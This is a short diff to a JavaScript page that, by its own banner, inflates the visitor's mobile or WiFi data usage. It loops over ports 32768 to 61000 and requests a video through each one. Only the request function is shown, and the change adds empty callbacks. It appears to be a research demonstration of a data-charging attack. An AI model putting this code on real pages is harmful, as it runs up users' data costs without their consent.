@@ -14,7 +14,12 @@ We are inflating your 3G/4G/WiFi data by enumerating ports from 32768 to 61000 t
     function ping(port) {
         var xhr = new XMLHttpRequest();
         var url = HOST + ':' + port + '/https://2459d6dc103cb5933875-c0245c5c937c5dedcca3f1764ecc9b2f.ssl.cf2.rackcdn.com/sec16/xiao.mp4';
+
         xhr.open("GET", url, true);
+
+        xhr.onload = function() {};
+        xhr.onerror = function() {};
+
         xhr.send();
     }
 
